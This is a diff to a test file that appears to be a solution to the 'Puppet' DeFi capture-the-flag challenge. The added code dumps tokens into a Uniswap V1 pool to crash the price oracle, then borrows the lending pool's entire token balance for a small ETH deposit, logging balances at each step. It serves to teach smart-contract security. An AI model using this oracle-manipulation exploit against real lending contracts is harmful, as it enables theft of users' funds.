@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
     return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
@@ -103,7 +104,53 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-    });
+        var bal;
+
+        const getStats = async (step) => {
+            console.log("step -  ", step);
+            
+
+            bal = await this.token.balanceOf(this.uniswapExchange.address);
+            console.log("uniswap token:",(bal/10**18).toString());
+
+            bal = await ethers.provider.getBalance(this.uniswapExchange.address);
+            console.log("uniswap ETH:",(bal/10**18).toString());
+
+            bal = await this.token.balanceOf(this.lendingPool.address);
+            console.log("pool token:",(bal/10**18).toString());
+
+            bal = await ethers.provider.getBalance(this.lendingPool.address);
+            console.log("pool ETH:",(bal/10**18).toString());
+
+            bal = await this.token.balanceOf(attacker.address);
+            console.log("attacker token:",(bal/10**18).toString());
+            bal = await ethers.provider.getBalance(attacker.address);
+            console.log("attacker ETH:",(bal/10**18).toString());
+        }
+
+        await getStats(1)
+
+        // approve the transaction: ATTACKER_INITIAL_TOKEN_BALANCE
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        // await getStats(2) // Nothing
+        
+        // swap token for eth: having more eth than token -> div will be rounded
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther('1')),
+            1, // at least 1
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+        await getStats(3)
+        
+        console.log("ll", (POOL_INITIAL_TOKEN_BALANCE/10**18).toString())
+        console.log("LL", ((await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE))/10**18).toString());
+        // borrow
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE, 
+            {value: await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}
+        );
+        await getStats(4)
+      });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
@@ -116,4 +163,7 @@ describe('[Challenge] Puppet', function () {
             await this.token.balanceOf(attacker.address)
         ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
     });
+
+    
 });
+
